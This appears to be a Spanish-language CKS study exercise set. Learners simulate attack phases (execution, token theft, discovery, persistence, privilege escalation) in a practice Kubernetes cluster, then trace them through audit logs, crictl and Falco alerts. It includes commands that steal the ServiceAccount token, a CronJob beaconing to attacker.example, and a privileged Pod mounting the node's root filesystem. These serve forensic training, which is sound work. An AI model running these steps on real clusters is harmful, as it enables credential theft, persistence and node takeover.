# Tema 6.3 — Investigate and identify phases of attack and bad actors within the environment (CKS v1.34)

> Peso en el examen: 4
> Fuente de referencia: [CKS Curriculum v1.34 (CNCF)](https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf)
> Framework de referencia para nombrar fases de ataque: [MITRE ATT&CK Matrix for Containers](https://attack.mitre.org/matrices/enterprise/containers/)

Estos ejercicios asumen un clúster de práctica (`kind` o `minikube`) con el Kubernetes audit log habilitado en `/var/log/kubernetes/audit/audit.log` (formato JSON por línea) y Falco corriendo como DaemonSet — ambos cubiertos en otros temas de este dominio. Verificá el prerequisito antes de arrancar:

```bash
minikube ssh -- sudo test -f /var/log/kubernetes/audit/audit.log && echo "audit log OK"
kubectl get pods -n falco -l app.kubernetes.io/name=falco
```

Vas a simular, paso a paso, las distintas fases de un ataque (siguiendo la nomenclatura de MITRE ATT&CK for Containers) y después vas a practicar cómo identificarlas y atribuirlas a un actor concreto usando las herramientas que tenés disponibles en un clúster real: el audit log, `crictl` y las alertas de Falco.

---

## Ejercicio 1 — Preparar el escenario y una línea base ("baseline")

1. Creá el namespace de trabajo:
   ```bash
   kubectl create namespace forense-6-3
   ```
2. Desplegá una app que representa el "objetivo vulnerable" del ejercicio, usando el `ServiceAccount` por defecto (con `automountServiceAccountToken` en su valor por defecto, es decir montado):
   ```bash
   kubectl run webapp --image=nginx:1.25 -n forense-6-3
   ```
3. Confirmá que el token del ServiceAccount quedó montado dentro del Pod:
   ```bash
   kubectl exec -n forense-6-3 webapp -- \
     ls /var/run/secrets/kubernetes.io/serviceaccount/
   ```
4. Antes de que ocurra cualquier incidente, generá una **línea base** de los objetos legítimos del namespace. Esto es lo que en una investigación real comparás contra el estado "post-incidente":
   ```bash
   kubectl get pods,cronjobs,rolebindings,serviceaccounts \
     -n forense-6-3 -o name > baseline-6-3.txt
   cat baseline-6-3.txt
   ```

### Preguntas de comprensión

1. ¿Por qué generar una línea base *antes* del incidente es un paso necesario para identificar la fase de **Persistence** más adelante?
2. El Pod `webapp` tiene el token del ServiceAccount montado por defecto. ¿Qué fase de ATT&CK for Containers se ve facilitada por esto si el Pod es comprometido?

---

## Ejercicio 2 — Detectar la fase de Execution en el audit log

Vas a simular que un atacante, tras explotar una vulnerabilidad en la app, obtiene ejecución de comandos dentro del contenedor (técnica *Container Administration Command*).

1. Simulá el acceso interactivo del atacante:
   ```bash
   kubectl exec -it -n forense-6-3 webapp -- sh -c "id; hostname"
   ```
2. Salí del contenedor y buscá en el audit log el evento correspondiente a ese `exec`:
   ```bash
   minikube ssh -- sudo cat /var/log/kubernetes/audit/audit.log \
     | jq -c 'select(.objectRef.resource=="pods" and .objectRef.subresource=="exec")'
   ```
3. De ese mismo evento, extraé solamente los campos clave para la investigación:
   ```bash
   minikube ssh -- sudo cat /var/log/kubernetes/audit/audit.log \
     | jq -c 'select(.objectRef.subresource=="exec") |
       {ts: .requestReceivedTimestamp, user: .user.username,
        groups: .user.groups, sourceIPs, ns: .objectRef.namespace,
        pod: .objectRef.name}'
   ```

### Preguntas de comprensión

3. ¿Qué campo del evento de audit log usarías como primer candidato a "bad actor" si el valor de `user.username` no corresponde a ningún operador humano conocido del equipo?
4. Un `pods/exec` contra `webapp` puede ser legítimo (un SRE debuggeando) o malicioso (un atacante). ¿Qué dato del mismo evento te ayuda a diferenciar ambos casos sin mirar ningún otro log?

---

## Ejercicio 3 — Detectar Credential Access y Discovery desde dentro del Pod

1. Simulá que el atacante, ya con shell en el contenedor, extrae las credenciales montadas:
   ```bash
   kubectl exec -n forense-6-3 webapp -- sh -c '
     TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
     CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
     echo "$TOKEN" > /tmp/stolen_token
     curl -sS --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
       https://kubernetes.default.svc/api/v1/namespaces/forense-6-3/pods -o /dev/null -w "%{http_code}\n"
     curl -sS --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
       https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets -o /dev/null -w "%{http_code}\n"
   '
   ```
2. Con ese mismo token, el atacante intenta reconocimiento (*Discovery*) de sus propios permisos:
   ```bash
   kubectl exec -n forense-6-3 webapp -- sh -c '
     TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
     curl -sS --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
       -H "Authorization: Bearer $TOKEN" -X POST \
       -H "Content-Type: application/json" \
       -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"list\",\"resource\":\"secrets\"}}}" \
       https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectaccessreviews
   '
   ```
3. Buscá ambos intentos en el audit log, incluyendo los **fallidos**:
   ```bash
   minikube ssh -- sudo cat /var/log/kubernetes/audit/audit.log \
     | jq -c 'select(.objectRef.resource=="secrets") |
       {ts: .requestReceivedTimestamp, user: .user.username,
        verb, ns: .objectRef.namespace, status: .responseStatus.code}'
   ```

### Preguntas de comprensión

5. El intento de listar `secrets` en `kube-system` debería devolver `403`. ¿Por qué ese evento **denegado** sigue siendo evidencia forense relevante en vez de descartarse por no haber tenido éxito?
6. ¿A qué dos fases (tactics) de ATT&CK for Containers corresponden, respectivamente, el paso 1 (robo del token) y el paso 2 (`SelfSubjectAccessReview`)?

---

## Ejercicio 4 — Detectar Persistence y Privilege Escalation

1. Simulá que el atacante, ya con un token o kubeconfig con más permisos, instala un mecanismo de persistencia — un `CronJob` no autorizado en `kube-system`:
   ```bash
   kubectl create -n kube-system -f - <<'EOF'
   apiVersion: batch/v1
   kind: CronJob
   metadata:
     name: cleanup
   spec:
     schedule: "*/5 * * * *"
     jobTemplate:
       spec:
         template:
           spec:
             containers:
             - name: cleanup
               image: busybox
               command: ["sh", "-c", "wget -qO- http://attacker.example/beacon || true"]
             restartPolicy: OnFailure
   EOF
   ```
2. Simulá además un intento de escalada de privilegios desplegando un Pod privilegiado con `hostPath` sobre la raíz del nodo:
   ```bash
   kubectl apply -n forense-6-3 -f - <<'EOF'
   apiVersion: v1
   kind: Pod
   metadata:
     name: escape-attempt
   spec:
     containers:
     - name: escape
       image: busybox
       command: ["sleep", "3600"]
       securityContext:
         privileged: true
       volumeMounts:
       - name: hostroot
         mountPath: /host
     volumes:
     - name: hostroot
       hostPath:
         path: /
   EOF
   ```
3. Detectá la desviación contra la línea base del Ejercicio 1:
   ```bash
   kubectl get pods,cronjobs,rolebindings,serviceaccounts \
     -n forense-6-3 -o name > current-6-3.txt
   diff baseline-6-3.txt current-6-3.txt
   kubectl get cronjobs -n kube-system
   ```
4. Confirmá el hallazgo a nivel de runtime con `crictl` en el nodo:
   ```bash
   minikube ssh -- sudo crictl ps -a
   minikube ssh -- sudo crictl inspect <container-id-de-escape-attempt> \
     | jq '.info.runtimeSpec.linux.namespaces, .status.labels'
   ```
5. Revisá si Falco generó una alerta para el Pod privilegiado:
   ```bash
   kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=200 \
     | grep -i "privileged\|sensitive mount"
   ```

### Preguntas de comprensión

7. La comparación `diff baseline-6-3.txt current-6-3.txt` no muestra ningún cambio en `forense-6-3` para el `CronJob`, aunque sí se creó uno malicioso. ¿Por qué, y qué corrige ese error de alcance en la investigación?
8. ¿Qué campo dentro de `crictl inspect` te confirma que el contenedor comparte namespaces con el host (indicio de container escape), y qué tactic de ATT&CK for Containers representa este paso?

---

## Ejercicio 5 — Reconstruir la línea de tiempo y atribuir al actor

1. Extraé del audit log **todos** los eventos asociados a la identidad que identificaste en el Ejercicio 2 (reemplazá `<username>` por el valor real observado, por ejemplo `system:serviceaccount:forense-6-3:default`):
   ```bash
   minikube ssh -- sudo cat /var/log/kubernetes/audit/audit.log \
     | jq -c --arg u "<username>" 'select(.user.username==$u) |
       {ts: .requestReceivedTimestamp, verb, resource: .objectRef.resource,
        ns: .objectRef.namespace, status: .responseStatus.code, sourceIPs}' \
     | sort
   ```
2. Con esa salida ordenada cronológicamente, armá manualmente una tabla de línea de tiempo con estas columnas: `timestamp | tactic (ATT&CK) | verbo/recurso | resultado`. Por ejemplo:

   | timestamp | tactic | verbo/recurso | resultado |
   |---|---|---|---|
   | t0 | Execution | pods/exec | 200 |
   | t1 | Credential Access | serviceaccount token leído localmente | n/a (no pasa por API) |
   | t2 | Discovery | selfsubjectaccessreviews | 201 |
   | t3 | Discovery (fallido) | secrets (kube-system) | 403 |
   | t4 | Persistence | cronjobs (create) | 201 |
   | t5 | Privilege Escalation | pods (create, privileged+hostPath) | 201 |

3. Cruzá la columna `sourceIPs` de todos los eventos: si es siempre la IP interna del nodo/Pod (por ejemplo la IP del clúster de `webapp`), y el `user.groups` incluye `system:serviceaccounts`, escribí una conclusión de atribución de una línea: identidad comprometida, origen (interno/externo), y el alcance (namespaces tocados).
4. Cerrá el ejercicio limpiando los objetos creados:
   ```bash
   kubectl delete pod escape-attempt -n forense-6-3
   kubectl delete cronjob cleanup -n kube-system
   kubectl delete namespace forense-6-3
   ```

### Preguntas de comprensión

9. En la tabla del paso 2, dos eventos (t1) no tienen un registro correspondiente en el audit log del API server. ¿Por qué, y qué fuente de datos sí lo captura?
10. Si `sourceIPs` fuera distinto entre t0-t3 y t4-t5 (por ejemplo, una IP externa aparece recién en t4), ¿qué hipótesis de investigación cambia respecto al escenario donde el origen es siempre el mismo?

---

<details>
<summary>Ver respuestas</summary>

**Ejercicio 1**

1. Sin una línea base del estado "sano" del namespace (Pods, CronJobs, RoleBindings, ServiceAccounts esperados), no hay forma de distinguir un objeto creado por el atacante de uno legítimo cuando se investiga después del incidente — la comparación (`diff`) es la técnica concreta que depende de esa base.
2. Facilita **Credential Access**: si el Pod es comprometido, el atacante obtiene automáticamente el token del ServiceAccount montado en el filesystem del contenedor, sin necesidad de un paso adicional de explotación.

**Ejercicio 2**

3. `user.username` (y complementariamente `user.groups`): si el valor no mapea a ningún usuario humano ni ServiceAccount de una automatización conocida, es la primera pista concreta de una identidad ilegítima o de una identidad legítima comprometida.
4. `sourceIPs`: un `exec` legítimo suele originarse desde la IP de la estación del operador o de un bastion host conocido; un valor inesperado (una IP interna de otro Pod, un rango no reconocido, o una IP externa si el apiserver es alcanzable) es la señal diferenciadora sin consultar otro sistema.

**Ejercicio 3**

5. Un evento denegado (403) demuestra **intención** — el actor intentó una acción fuera de su alcance de permisos — y es exactamente el tipo de evidencia que permite reconstruir la fase de **Discovery/enumeración**: aunque no tuvo éxito, revela qué estaba buscando el atacante y contra qué RBAC chocó.
6. El paso 1 (robo y uso del token) corresponde a **Credential Access**; el paso 2 (`SelfSubjectAccessReview`, es decir, "¿qué puedo hacer con este token?") corresponde a **Discovery**.

**Ejercicio 4**

7. Porque el `CronJob` malicioso se creó en el namespace `kube-system`, no en `forense-6-3` — el `diff` solo cubre el namespace donde se generó la línea base originalmente. Corrige el error ampliando el alcance de la línea base a **todos los namespaces relevantes** (o a todo el clúster) antes de comparar, en vez de asumir que el atacante se queda dentro del namespace comprometido inicialmente.
8. El campo `.info.runtimeSpec.linux.namespaces` en la salida de `crictl inspect`: si falta el namespace `pid`, `net` o `mnt` (o aparecen vacíos/compartidos con el host), el contenedor está corriendo con namespaces del host. Este paso representa la tactic **Privilege Escalation** (y, de completarse el escape, también **Defense Evasion**, al operar fuera del aislamiento esperado del contenedor).

**Ejercicio 5**

9. La lectura local del token (`cat` del archivo dentro del contenedor) nunca llega al kube-apiserver, por lo que el audit log del API server no la registra — solo lo hacen los logs a nivel de syscall/proceso del nodo (por ejemplo Falco o auditd), que es la fuente que sí captura acceso a archivos dentro del contenedor.
10. Un cambio de `sourceIPs` a mitad de la línea de tiempo sugiere que el atacante pasó de operar **dentro** del Pod comprometido (usando el token robado desde ese mismo origen) a operar **fuera** del clúster con credenciales exfiltradas (por ejemplo, usando el token robado desde su propia máquina) — es decir, la investigación pasaría de "actor interno con acceso a un Pod" a "exfiltración de credenciales seguida de acceso remoto", ampliando el radio de contención necesario más allá del Pod original.

</details>